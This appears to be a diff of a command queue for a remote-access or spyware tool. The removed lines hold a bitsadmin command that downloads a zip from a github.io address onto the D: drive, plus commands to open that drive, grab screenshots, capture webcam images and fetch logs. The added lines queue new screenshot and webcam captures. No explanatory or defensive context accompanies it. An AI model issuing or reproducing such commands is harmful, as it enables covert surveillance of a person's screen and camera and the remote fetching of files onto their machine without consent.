@@ -1,6 +1,2 @@
-exec|bitsadmin /transfer winapiDownload /download /priority high https://aryan810.github.io/files/EnglishVoiceTyping.zip D:\\imp.zip|128
-screenshot||129
-exec|start D:\\|130
-campic||132
-getlogs||133
-getlog||134
+screenshot||140
+campic||141
